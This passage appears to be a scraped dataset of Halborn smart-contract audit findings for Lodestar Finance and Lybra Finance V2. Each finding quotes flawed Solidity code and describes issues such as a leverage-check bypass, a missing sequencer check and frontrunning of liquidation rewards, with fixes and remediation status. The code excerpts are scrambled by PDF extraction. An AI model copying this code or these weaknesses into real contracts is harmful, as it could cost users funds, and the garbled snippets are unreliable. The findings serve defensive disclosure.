mint GLP . approval needed . uint256 glpAmount = REWARD_ROUTER_V2 . mintAndStakeGlp ( address ( data . borrowedToken ) , data . borrowedAmount , 0, 0 ); if ( glpAmount == 0) revert FAILED ( ' glp =0 '); // TODO whitelist this contract for plvGLP mint // mint plvGLP . approval needed . uint256 _oldPlvglpBal = PLVGLP . balanceOf ( address ( this )) ; GLP_DEPOSITOR . deposit ( glpAmount ); // check new balances and confirm we properly minted uint256 _newPlvglpBal = PLVGLP . balanceOf ( address ( this )) ; emit plvGLPBalance ( _newPlvglpBal ); require ( _newPlvglpBal > _oldPlvglpBal , \" glp deposit failed ,  new balance < old balance \" ); 218 219 220 221 222 } uint256 _finalBal ; // mint our respective token by depositing it into Lodestar 's  respective lToken contract ( approval needed ) 223 224 unchecked { lTokenMapping [ data . tokenToLoop ]. mint ( data . tokenToLoop .  balanceOf ( address ( this )) ); 225 lTokenMapping [ data . tokenToLoop ]. transfer ( data . user ,  lTokenMapping [ data . tokenToLoop ]. balanceOf ( address ( this )) ); 226 _finalBal = lTokenMapping [ data . tokenToLoop ]. balanceOf ( address (  this )); 227 228 229 emit lTokenBalance ( _finalBal ); require ( _finalBal == 0 , \" lToken balance not 0 at the end of  loop \"); 39 230 231 232 233 } // call borrowBehalf to borrow tokens on behalf of user lTokenMapping [ data . tokenToLoop ]. borrowBehalf ( data . borrowedAmount  , data . user ); 234 235 // repay loan , where msg . sender = vault data . tokenToLoop . safeTransferFrom ( data . user , msg . sender , data .  borrowedAmount ); 236 } As the repayment of the flash loan is done with the wrong token, the the reverts INVALID_POST_LOAN_BALANCE. transaction following BAL#515 - error: with BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:H/D:N/Y:N/R:N/S:U (7.5) Recommendation: It is recommended to update the receiveFlashLoan() function so, in the case that the tokenToLoop is plvGLP, the repayment is done with USDC. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 306d538a0b295fb96b37ccd774c27fb658b0538f. 40 ",
        "labels": [
            "Halborn",
            "Lodestar_Lodestar_Finance",
            "Severity: High"
        ]
    },
    {
        "title": "PLOOPY LEVERAGE CALCULATION IS WRONGLY IMPLEMENTED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the Ploopy contract, the function loop() allows users to loop to a desired leverage, within a pre-set range of 1x to 3x leverage: Listing 13: Ploopy.sol (Lines 140,147) 112 function loop ( IERC20 _token , uint256 _amount , uint16 _leverage ,  uint16 _useWalletBalance ) external { 113 114 115 116 require ( allowedTokens [ _token ], \" token not allowed to loop \" ); require ( tx . origin == msg . sender , \" not an EOA \"); require ( _amount > 0, \" amount must be greater than 0 \" ); require ( _leverage >= DIVISOR && _leverage <= MAX_LEVERAGE , \"  invalid leverage , range must be between DIVISOR and MAX_LEVERAGE  values \"); 117 118 // if the user wants us to mint using their existing wallet  balance ( indiciated with 1) , then do so . 119 // otherwise , read their existing balance and flash loan to  increase their position 120 121 122 123 124 125 126 127 128 129 130 131 132 if ( _useWalletBalance == 1) { // transfer tokens to this contract so we can mint in 1 go . _token . safeTransferFrom ( msg . sender , address ( this ) , _amount ); emit Transfer ( msg . sender , address ( this ) , _amount ); } uint256 loanAmount ; IERC20 _tokenToBorrow ; if ( _token == PLVGLP ) { uint256 _tokenPriceInEth ; uint256 _usdcPriceInEth ; uint256 _computedAmount ; 41 133 134 135 136 // plvGLP borrows USDC to loop _tokenToBorrow = USDC ; _tokenPriceInEth = PRICE_ORACLE . getUnderlyingPrice ( address (  lTokenMapping [ _token ]) ); 137 _usdcPriceInEth = ( PRICE_ORACLE . getUnderlyingPrice ( address (  lUSDC )) / 1 e12 ); 138 _computedAmount = ( _amount * ( _tokenPriceInEth /  _usdcPriceInEth )); 139 140 141 142 143 144 145 loanAmount = getNotionalLoanAmountIn1e18 ( _computedAmount , _leverage ); } else { // the rest of the contracts just borrow whatever token is  supplied 146 147 148 _tokenToBorrow = _token ; loanAmount = getNotionalLoanAmountIn1e18 ( _amount , // we can just send over the exact amount , as we  are either looping stables or eth 149 150 151 152 153 _leverage ); } if ( _tokenToBorrow . balanceOf ( address ( BALANCER_VAULT )) <  loanAmount ) revert FAILED ( ' balancer vault token balance < loan '); 154 155 emit Loan ( loanAmount ); emit BalanceOf ( _tokenToBorrow . balanceOf ( address ( BALANCER_VAULT ))  , loanAmount ); 156 157 158 // check approval to spend USDC ( for paying back flashloan ). // possibly can omit to save gas as tx will fail with exceed  allowance anyway . 159 if ( _tokenToBorrow . allowance ( msg . sender , address ( this )) <  loanAmount ) revert INVALID_APPROVAL () ; 160 emit Allowance ( _tokenToBorrow . allowance ( msg . sender , address ( this  )) , loanAmount ); 161 162 163 164 165 166 IERC20 [] memory tokens = new IERC20 [](1) ; tokens [0] = _tokenToBorrow ; uint256 [] memory loanAmounts = new uint256 [](1) ; loanAmounts [0] = loanAmount ; 42 167 168 169 170 171 172 173 174 175 UserData memory userData = UserData ({ user : msg . sender , tokenAmount : _amount , borrowedToken : _tokenToBorrow , borrowedAmount : loanAmount , tokenToLoop : _token }) ; emit UserDataEvent ( msg . sender , _amount , address ( _tokenToBorrow ) ,  loanAmount , address ( _token )) ; 176 177 BALANCER_VAULT . flashLoan ( IFlashLoanRecipient ( this ) , tokens ,  loanAmounts , abi . encode ( userData )); 178 } In order to calculate the amount of tokens loaned, the internal view function getNotionalLoanAmountIn1e18() is called: Listing 14: Ploopy.sol (Line 225) 220 function getNotionalLoanAmountIn1e18 ( uint256 _notionalTokenAmountIn1e18 , 221 222 uint16 _leverage 223 ) private pure returns ( uint256 ) { 224 225 unchecked { return (( _leverage - DIVISOR ) * _notionalTokenAmountIn1e18 ) /  DIVISOR ; } 226 227 } After the loanAmount is calculated, a flash loan is taken from the Balancer Vault, the flash loaned tokens are used to mint more cTokens and then those tokens are borrowed from the Lodestar market to repay the flash loan. Although, the leverage calculation or the term leverage is wrongly used here as it simply defines the amount of assets that will be flash loaned from Balancer without considering the current position of the user in Lodestar. For example, lets imagine these 2 different situations: 43 Situation 1 User1 initial liquidity: - liquidity: 4_907186648501354500 - shortfall: 0 Uner1 initial snapshot: - cWantBalance: 50000000000000 - borrowed: 0 - exchangeRate: 200000000000000 User1 calls: contract_Ploopy.loop(USDC, 1000e6, 30000, 0) - 2000_000000 USDC is flash loaned from Balancer Vault. - mint() is called, minting more cTokens. - 100000_00000000 cTokens are transferred to user1. - 2000_000000 USDC are borrowed from the lUSDC market. - This 2000_000000 USDC is used to repay the Balancers flash loan. User1 final liquidity: - liquidity: 4_734319793085926400 - shortfall: 0 Uner1 final snapshot: - cWantBalance: 60000000000000 - borrowed: 2000000000 - exchangeRate: 200000000000000 Situation 2 User1 initial liquidity: - liquidity: 4_907186648501354500 - shortfall: 0 Uner1 initial snapshot: - cWantBalance: 50000000000000 - borrowed: 0 - exchangeRate: 200000000000000 User1 calls: contract_Ploopy.loop(USDC, 2000e6, 20000, 0) - 2000_000000 USDC is flash loaned from Balancer Vault. - mint() is called, minting more cTokens. - 100000_00000000 cTokens are transferred to user1. - 2000_000000 USDC are borrowed from the lUSDC market. 44 - This 2000_000000 USDC is used to repay the Balancers flash loan. User1 final liquidity: - liquidity: 4_734319793085926400 - shortfall: 0 Uner1 final snapshot: - cWantBalance: 60000000000000 - borrowed: 2000000000 - exchangeRate: 200000000000000 As we can see, both situations end up flash loaning 2000 USDC from Balancer and getting the user1 Lodestars position to the same liquidity. Hence, the leverage check of being between 1x and 3x can be easily bypassed as the user can simply call the loop() function with a higher _amount. BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:M/Y:N/R:N/S:U (5.6) 45 Recommendation: Consider refactoring the loop() function and the Ploopy contract in general, so the looping considers the current position of the user in Lodestar to calculate the leverage. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 164063788549a7b9db59284c36eab7905d76dcc6. 46 ",
        "labels": [
            "Halborn",
            "Lodestar_Lodestar_Finance",
            "Severity: Medium"
        ]
    },
    {
        "title": "SEQUENCER STATUS IS NOT CHECKED FOR LPLVGLP PRICE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the PriceOracleProxyETH contract the function getUnderlyingPrice() gets the underlying price of a listed cToken asset: Listing 15: PriceOracleProxyETH.sol (Line 108) * @notice Get the underlying price of a listed cToken asset * @param cToken The cToken to get the underlying price of * @return The underlying asset price mantissa ( scaled by 1 e18 ) 92 /* * 93 94 95  Price is given in ether (1 e18 = 1 ether ) 96 97 function getUnderlyingPrice ( CToken cToken ) public view returns (  uint256 ) { 98 99  cTokenAddress ]; address cTokenAddress = address ( cToken ); AggregatorInfo memory aggregatorInfo = aggregators [ */ 100 101 102 103 104 105 if ( cTokenAddress == letherAddress ) { uint256 price = 1 e18 ; return price ; } else if ( cTokenAddress == lplvGLPAddress ) { uint256 price = getPlvGLPPrice () ; price = div_ ( price , Exp ({ mantissa : getPriceFromChainlink (  ethUsdAggregator ) }) ); return price ; 106 107 108 } else if ( address ( aggregatorInfo . source ) != address (0) ) { bool sequencerStatus = getSequencerStatus ( sequencerAddress  ); 109  source ); uint256 price = getPriceFromChainlink ( aggregatorInfo . 110 if ( sequencerStatus == false ) { 47 111 // If flag is raised we shouldn 't perform any critical  operations 112 113 114 115 revert (\" Chainlink feeds are not being updated \"); } else if ( aggregatorInfo . base == AggregatorBase . USD ) { // Convert the price to ETH based if it 's USD based . price = div_ ( price , Exp ({ mantissa :  getPriceFromChainlink ( ethUsdAggregator ) }) ); 116 uint256 underlyingDecimals = EIP20Interface ( CErc20 (  cTokenAddress ). underlying () ). decimals () ; 117 118 119 return price * 10 ** (18 - underlyingDecimals ); } else if ( aggregatorInfo . base == AggregatorBase . ETH ) { uint256 underlyingDecimals = EIP20Interface ( CErc20 (  cTokenAddress ). underlying () ). decimals () ; 120 121 122 123 124 } return price * 10 ** (18 - underlyingDecimals ); } } revert ( \" Invalid Oracle Request \" ); In the line 108, a call is done to the sequencer feed in order to check its status and revert in case that the sequencer is down. Although, this should also be checked when cTokenAddress == lplvGLPAddress as a call to the ethUsdAggregator is also done. This could lead to get an outdated price from the ethUsdAggregator. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:M/Y:N/R:N/S:U (5.0) Recommendation: It is recommended to update the getUnderlyingPrice() function as shown below: Listing 16: PriceOracleProxyETH.sol (Lines 100,105,106,107,108) 92 /* * 93 94 * @notice Get the underlying price of a listed cToken asset * @param cToken The cToken to get the underlying price of 48 */ * @return The underlying asset price mantissa ( scaled by 1 e18 ) 95  Price is given in ether (1 e18 = 1 ether ) 96 97 function getUnderlyingPrice ( CToken cToken ) public view returns (  uint256 ) { 98 99  cTokenAddress ]; address cTokenAddress = address ( cToken ); AggregatorInfo memory aggregatorInfo = aggregators [ 100 101 102 103 104 105 106 107 108 109 110 bool sequencerStatus ; if ( cTokenAddress == letherAddress ) { uint256 price = 1 e18 ; return price ; } else if ( cTokenAddress == lplvGLPAddress ) { sequencerStatus = getSequencerStatus ( sequencerAddress ); if ( sequencerStatus == false ){ revert (\" Chainlink feeds are not being updated \"); } uint256 price = getPlvGLPPrice () ; price = div_ ( price , Exp ({ mantissa : getPriceFromChainlink (  ethUsdAggregator ) }) ); return price ; 111 112 113 114 } else if ( address ( aggregatorInfo . source ) != address (0) ) { sequencerStatus = getSequencerStatus ( sequencerAddress ); uint256 price = getPriceFromChainlink ( aggregatorInfo .  source ); 115 116 if ( sequencerStatus == false ) { // If flag is raised we shouldn 't perform any critical  operations 117 118 119 120 revert (\" Chainlink feeds are not being updated \"); } else if ( aggregatorInfo . base == AggregatorBase . USD ) { // Convert the price to ETH based if it 's USD based . price = div_ ( price , Exp ({ mantissa :  getPriceFromChainlink ( ethUsdAggregator ) }) ); 121 uint256 underlyingDecimals = EIP20Interface ( CErc20 (  cTokenAddress ). underlying () ). decimals () ; 122 123 124 return price * 10 ** (18 - underlyingDecimals ); } else if ( aggregatorInfo . base == AggregatorBase . ETH ) { uint256 underlyingDecimals = EIP20Interface ( CErc20 (  cTokenAddress ). underlying () ). decimals () ; 125 126 127 128 129 } return price * 10 ** (18 - underlyingDecimals ); } } revert ( \" Invalid Oracle Request \" ); 49 Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 241ad9405b6b0d950eca14faeb3a7bf2fd18c824. 50 ",
        "labels": [
            "Halborn",
            "Lodestar_Lodestar_Finance",
            "Severity: Medium"
        ]
    },
    {
        "title": "SWAPTHROUGHUNISWAP CALL WILL ALWAYS REVERT AS NATIVEUSDC WILL ALWAYS BE ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the Loopy contract, in the receiveFlashloan() function, in the specific logic related to the USDC market, the following call is executed: Listing 17: Loopy.sol 326 lUSDC . borrowBehalf ( repayAmountFactoringInFeeAmount , data . user ); Although, the This call will borrow and send USDC to the data.user. contract assumes that this USDC amount will be received by the contract itself: Listing 18: Loopy.sol 327 // we need to swap our native USDC for bridged USDC to repay the  loan 328 uint256 nativeUSDCBalance = USDC_NATIVE . balanceOf ( address ( this )) ; For this reason, the variable nativeUSDCBalance will always be zero, reverting during the Swap.swapThroughUniswap() call, as the amountIn will be zero. BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:N/S:U (5.0) 51 Recommendation: It is recommended to transfer the USDC_NATIVE from the data.user to the Loopy contract before the swapThroughUniswap() call. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 7c706d50739de365cff6b46739f5e71bf37db4ac. 52 ",
        "labels": [
            "Halborn",
            "Lodestar_Lodestar_Finance",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING INITIAL SWAP CALL TO CONVERT USDCBRIDGED INTO USDCNATIVE BEFORE MINTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the Loopy contract some special logic was implemented as the new USDC market deployed will use USDC_NATIVE while the balancers vault uses USDC_BRIDGED. Basically, when looping with USDC_NATIVE, USDC_BRIDGED is flash loaned. Although, as the underlying of the USDC market is USDC_NATIVE, a swap from USDC_BRIDGED to USDC_NATIVE is needed in order to call mint() in the USDC market. This initial swap is missing in the code. For this reason, any loop() call with _useWalletBalance == 0 will revert. BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:N/S:U (5.0) Recommendation: It is recommended to implement the missing initial swap from USDC_BRIDGED to USDC_NATIVE in the Loopy.receiveFlashLoan() function. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. 53 Commit ID : 7c706d50739de365cff6b46739f5e71bf37db4ac. 54 ",
        "labels": [
            "Halborn",
            "Lodestar_Lodestar_Finance",
            "Severity: Medium"
        ]
    },
    {
        "title": "USEWALLETBALANCE PARAMETER IS NOT USED CORRECTLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the Ploopy contract, the function loop() contains the parameter _useWalletBalance. This parameter is used in case that the user wants the contract to mint using their existing wallet balance. Otherwise, the contract should read his existing balance and flash loan to increase his position. This logic is not correctly implemented, as the contract will always take a flash loan. For example, with the following loop() parameters: - _token = USDC - _amount = 1000e6 - _leverage = 20000 - _useWalletBalance = 1 1000e6 USDC will be transferred to the smart contract, then a flash loan of another 1000e6 will be taken, and 2000e6 USDC in total will be minted for lUSDC. In the case that, _useWalletBalance is set to 1, a flash loan should not be taken, and the contract should simply call mint() to transfer the cTokens to the user and then call the borrowBehalf() function. BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:L/Y:N/R:N/S:C (3.9) 55 Recommendation: It is recommended to correct the logic of the loop() function, so it does not take a flash loan when _useWalletBalance is set to 1. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 164063788549a7b9db59284c36eab7905d76dcc6. 56 4.10 (HAL-10) BLOCKSPERYEAR ARE NOT CORRECTLY ADJUSTED IN THE RATE MODELS - LOW (3.1) Commit IDs affected: - d19be010dea56ba706449e68d394591e97b30916 ",
        "labels": [
            "Halborn",
            "Lodestar_Lodestar_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "CURVEPOOL.EXCHANGEUNDERLYING(",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the LybraConfigurator contract, the function distributeRewards() in- ternally calls the curvePool.exchange_underlying() function to convert eUSD into peUSD: Listing 1: LybraConfigurator.sol (Line 323) uint256 balance = EUSD . balanceOf ( address ( this )); if ( balance >= 1 e21 ) { 316 function distributeRewards () external { 317 318 319 320 321 322 323 if ( premiumTradingEnabled ){ (, int price , , , ) = eUSDPriceFeed . latestRoundData () ; if ( price >= 100 _500_000 ){ EUSD . approve ( address ( curvePool ) , balance ); uint256 amount = curvePool . exchange_underlying (0 ,  2, balance , balance * uint ( price ) * 998 / 1 e23 ); 324 IERC20 ( stableToken ). safeTransfer ( address (  lybraProtocolRewardsPool ) , amount ); 325  , 1) ; 326 lybraProtocolRewardsPool . notifyRewardAmount ( amount emit SendProtocolRewards ( stableToken , amount ,  block . timestamp ); 327 328 329 330 331 332 } } else { peUSD . convertToPeUSD ( address ( this ) , balance ); } } uint256 peUSDBalance = peUSD . balanceOf ( address ( this )) ; 22 333 334 if ( peUSDBalance >= 1 e21 ) { peUSD . transfer ( address ( lybraProtocolRewardsPool ) ,  peUSDBalance ); 335  0) ; 336 lybraProtocolRewardsPool . notifyRewardAmount ( peUSDBalance , emit SendProtocolRewards ( address ( peUSD ) , peUSDBalance ,  block . timestamp ); 337 338 } } This call makes 2 assumptions wrongly: 1. Assumes that the USDC price will always be pegged to 1 USD. 2. Sets a maximum slippage of 0.2%. As most of the Curve Pools have by default a 0.015% total fee (DAO fee + protocol fee) and USDC price may not be exactly pegged to 1 USD it is entirely possible that the curvePool.exchange_underlying() call reverts due to high slippage. In that case, any distributeRewards() call would revert leaving the ProtocolRewards contract without rewards. BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:N/D:N/Y:N/R:N/S:U (7.5) Recommendation: It is recommended to calculate the price of USDC with high precision using an external oracle. It is also recommended to implement a setter to update the maximum slippage tolerance in the curvePool.exchange_underlying() call. Remediation Plan: SOLVED: The Lybra Finance team solved the issue by increasing the maximum slippage to 0.5%. Commit ID : 8c4ec31df7978acd25bd8eb95a22dc056a9be553. 23 ",
        "labels": [
            "Halborn",
            "Lybra_Finance_V2",
            "Severity: High"
        ]
    },
    {
        "title": "PEUSD.CONVERTTOPEUSD(",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the LybraConfigurator contract, the function distributeRewards() in- ternally calls PeUSDMainnet.convertToPeUSD() function to exchange eUSD for USDC: Listing 2: LybraConfigurator.sol (Line 329) uint256 balance = EUSD . balanceOf ( address ( this )); if ( balance >= 1 e21 ) { 316 function distributeRewards () external { 317 318 319 320 321 322 323 if ( premiumTradingEnabled ){ (, int price , , , ) = eUSDPriceFeed . latestRoundData () ; if ( price >= 100 _500_000 ){ EUSD . approve ( address ( curvePool ) , balance ); uint256 amount = curvePool . exchange_underlying (0 ,  2, balance , balance * uint ( price ) * 998 / 1 e23 ); 324 IERC20 ( stableToken ). safeTransfer ( address (  lybraProtocolRewardsPool ) , amount ); 325  , 1) ; 326 lybraProtocolRewardsPool . notifyRewardAmount ( amount emit SendProtocolRewards ( stableToken , amount ,  block . timestamp ); 327 328 329 330 331 332 333 } } else { peUSD . convertToPeUSD ( address ( this ) , balance ); } } uint256 peUSDBalance = peUSD . balanceOf ( address ( this )) ; if ( peUSDBalance >= 1 e21 ) { 24 334 peUSD . transfer ( address ( lybraProtocolRewardsPool ) ,  peUSDBalance ); 335  0) ; 336 lybraProtocolRewardsPool . notifyRewardAmount ( peUSDBalance , emit SendProtocolRewards ( address ( peUSD ) , peUSDBalance ,  block . timestamp ); 337 338 } } Although, this call could always revert as there is a limit of peUSD that can be minted by using eUSD which is given by the LybraConfigurator .getEUSDMaxLocked() function: Listing 3: PeUSDMainnet.sol (Line 78) * @param eusdAmount The amount of eUSD to deposit and mint peUSD * @notice Allows the user to deposit eUSD and mint peUSD tokens . * @param user The address of the user who wants to deposit eUSD 70 /* * 71 72  and mint peUSD . It can only be the contract itself or the msg .  sender . 73  tokens . 74 */ 75 function convertToPeUSD ( address user , uint256 eusdAmount ) public { 76 require ( _msgSender () == user || _msgSender () == address ( this ) ,  \" MDM \" ); 77 78  configurator . getEUSDMaxLocked () ,\" ESL \" ); 79  eusdAmount ); 80 81  getSharesByMintedEUSD ( eusdAmount ); 82 83 84  timestamp ); 85 } userConvertInfo [ user ]. mintedPeUSD += eusdAmount ; _mint ( user , eusdAmount ); emit ConvertToPeUSD ( msg . sender , eusdAmount , eusdAmount , block . require ( eusdAmount != 0 , \" ZA \"); require ( EUSD . balanceOf ( address ( this )) + eusdAmount <= require ( success , \" TF \" ); userConvertInfo [ user ]. depositedEUSDShares += EUSD . bool success = EUSD . transferFrom ( user , address ( this ) , If this limit is reached and the price of eUSD is lower than 1,005 USD, 25 any distributeRewards() call would revert, leaving the ProtocolRewards contract without rewards. BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:N/D:N/Y:N/R:N/S:U (7.5) Recommendation: It is recommended to add a check to the convertToPeUSD() function that if it is used for dividend conversion, it will not be subject to the getEUSDMaxLocked() limitation. Remediation Plan: SOLVED: The Lybra Finance team solved the issue by implementing the rec- ommended solution. Commit ID : d050e08072633dcccd69155a36901c9434dfdb58. 26 ",
        "labels": [
            "Halborn",
            "Lybra_Finance_V2",
            "Severity: High"
        ]
    },
    {
        "title": "LYBRACONFIGURATOR CONTRACT ASSUMES THAT THE USDC PRICE WILL BE ALWAYS PEGGED TO 1 USD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The LybraConfigurator.distributeRewards() function, under certain condi- tions, exchanges eUSD for USDC using Curve. This function assumes that the USDC price will always remain pegged to 1 USD. This assumption introduces several concerns: 1. Peg Deviation: Even though USDC is a stablecoin designed to maintain a peg to the US dollar, theres no guarantee it will always be exactly 1 dollar. Market dynamics, liquidity concerns, or unforeseen events can cause temporary or even long-term deviations. 2. Contract Logic Vulnerability: If the contracts logic heavily re- lies on the USDC being always pegged at 1 dollar, any deviation can result in incorrect calculations, leading to potential losses, denial of service or other undesired outcomes. 3. Reduced Resilience to Black Swan Events: In the case of unprece- dented events in the crypto space, USDC, like any other asset, can face challenges. Banking issues, regulatory crackdowns, or problems with Circle (the issuer of USDC) might affect the peg. 4. Arbitrage Opportunities: If USDC diverges from its $1 peg and the contract assumes its always $1, it can create arbitrage opportuni- ties. Malicious actors might exploit these to drain funds or gain unfair advantages. For all these reasons, it is always recommended to use an external oracle 27 to retrieve and validate the price of USDC with high precision, preventing all the risks mentioned above. BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:N/S:C (6.2) Recommendation: It is recommended to use an external oracle to retrieve and validate the price of USDC with high precision. Remediation Plan: RISK ACCEPTED: The Lybra Finance team accepted the risk of this finding. 28 ",
        "labels": [
            "Halborn",
            "Lybra_Finance_V2",
            "Severity: Medium"
        ]
    },
    {
        "title": "LIQUIDATION CALLS CAN BE FRONTRUN STEALING THE REWARD2KEEPER FEE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the LybraPeUSDVaultBase contract, the function liquidation() liqui- dates borrowers whose collateral ratio is below badCollateralRatio, using peUSD provided by the Liquidation Provider: Listing 4: LybraPeUSDVaultBase.sol (Line 132) 114 /* * 115 * @notice Keeper liquidates borrowers whose collateral ratio is  below badCollateralRatio , using peUSD provided by Liquidation  Provider . 116 117 118 * * Requirements : * - onBehalfOf Collateral Ratio should be below  badCollateralRatio 119 120 121 * - assetAmount should be less than 50% of collateral * - provider should authorize Lybra to utilize peUSD * @dev After liquidation , borrower 's debt is reduced by  assetAmount * assetPrice , providers and keepers can receive up to  an additional 10% liquidation reward . */ 122 123 function liquidation ( address provider , address onBehalfOf , uint256  assetAmount ) external virtual { 124 125 uint256 assetPrice = getAssetPrice () ; uint256 onBehalfOfCollateralRatio = ( depositedAsset [ onBehalfOf  ] * assetPrice * 100) / getBorrowedOf ( onBehalfOf ); 126 require ( onBehalfOfCollateralRatio < configurator .  getBadCollateralRatio ( address ( this )) , \" Borrowers collateral ratio  should below badCollateralRatio \" ); 127 128 require ( assetAmount * 2 <= depositedAsset [ onBehalfOf ], \" a max  of 50% collateral can be liquidated \"); 29 129 require ( PeUSD . allowance ( provider , address ( this )) != 0 || msg .  sender == provider , \" provider should authorize to provide  liquidation peUSD \" ); 130 131 132 133 134 uint256 peusdAmount = ( assetAmount * assetPrice ) / 1 e18 ; _repay ( provider , onBehalfOf , peusdAmount ); uint256 reducedAsset = assetAmount ; if ( onBehalfOfCollateralRatio > 1 e20 &&  onBehalfOfCollateralRatio < 11 e19 ) { 135 reducedAsset = assetAmount * onBehalfOfCollateralRatio / 1  e20 ; 136 137 138 139 140 141 142 } if ( onBehalfOfCollateralRatio >= 11 e19 ) { reducedAsset = assetAmount * 11 / 10; } depositedAsset [ onBehalfOf ] -= reducedAsset ; uint256 reward2keeper ; uint256 keeperRatio = configurator . vaultKeeperRatio ( address (  this )); 143 if ( msg . sender != provider && onBehalfOfCollateralRatio >= 1  e20 + keeperRatio * 1 e18 ) { 144 145 146 147 reward2keeper = assetAmount * keeperRatio / 100; collateralAsset . safeTransfer ( msg . sender , reward2keeper ); } collateralAsset . safeTransfer ( provider , reducedAsset -  reward2keeper ); 148 emit LiquidationRecord ( provider , msg . sender , onBehalfOf ,  peusdAmount , reducedAsset , reward2keeper , false , block . timestamp ); 149 } The liquidation() function calls internally the _repay() function: Listing 5: LybraPeUSDVaultBase.sol (Lines 204,210) 192 /* * 193 * @notice Burn _provideramount peUSD to payback minted peUSD for  _onBehalfOf . 194 195 * * @dev Refresh LBR reward before reducing providers debt . Refresh  Lybra generated service fee before reducing totalPeUSDCirculation  . */ 196 197 function _repay ( address _provider , address _onBehalfOf , uint256 30  _amount ) internal virtual { 198 199 200 201 configurator . refreshMintReward ( _onBehalfOf ); _updateFee ( _onBehalfOf ); uint256 totalFee = feeStored [ _onBehalfOf ]; uint256 amount = borrowed [ _onBehalfOf ] + totalFee >= _amount ?  _amount : borrowed [ _onBehalfOf ] + totalFee ; 202 203 204 if ( amount > totalFee ) { feeStored [ _onBehalfOf ] = 0; PeUSD . transferFrom ( _provider , address ( configurator ) ,  totalFee ); 205 206 207 208 209 210 PeUSD . burn ( _provider , amount - totalFee ); borrowed [ _onBehalfOf ] -= amount - totalFee ; poolTotalCirculation -= amount - totalFee ; } else { feeStored [ _onBehalfOf ] = totalFee - amount ; PeUSD . transferFrom ( _provider , address ( configurator ) ,  amount ); 211 212 213 214 } } try configurator . distributeRewards () {} catch {} emit Burn ( _provider , _onBehalfOf , amount , block . timestamp ); In order to call the liquidation function, the provider must first approve the Vault contract. Based on this, the normal flow would be: 1. Provider PeUSD approves the Vault. 2. liquidated address>, <liquidated amount>) 3. Provider receives collateralAsset up to a 10% discount. 4. Provider receives reward2keeper fee. Vault.liquidation(<Provider address>, <user Provider calls Although, with the current implementation that allows setting a provider address different from msg.sender, the following attack vector would be possible: 1. Provider PeUSD approves the Vault. 2. liquidated address>, <liquidated amount>) 3. reward2keeper fee. 4. Provider receives collateralAsset up to a 10% discount. 5. Provider transaction reverts as it was frontrun. The liquidation call is frontrun by a MEV bot stealing the Vault.liquidation(<Provider address>, <user Provider calls 31 Note that reward2keeper can be up to 5% as: Listing 6: LybraConfigurator.sol (Line 257) 251 /* * 252 * @notice Set the reward ratio for the liquidator after  liquidation . 253 * @param pool The address of the pool to set the reward ratio for  . 254 * @param newRatio The new reward ratio to set , limited to a  maximum of 5%. */ 255 256 function setKeeperRatio ( address pool , uint256 newRatio ) external  checkRole ( TIMELOCK ) { require ( newRatio <= 5, \" Max Keeper reward is 5% \"); vaultKeeperRatio [ pool ] = newRatio ; emit KeeperRatioChanged ( pool , newRatio ); 257 258 259 260 } BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:M/R:N/S:U (6.2) Recommendation: It is recommended to remove the address provider parameter from the liquidation() function and use always msg.sender as the provider. Remediation Plan: SOLVED: The Lybra Finance team solved the issue. If users decide that others should not use their funds for liquidation they have the option to not authorize an allowance to the storage contract. Commit ID : d050e08072633dcccd69155a36901c9434dfdb58. 32 ",
        "labels": [
            "Halborn",
            "Lybra_Finance_V2",
            "Severity: Medium"
        ]
    },
    {
        "title": "LYBRAGOVERNANCE PROPOSAL CREATION CAN BE DOSED",
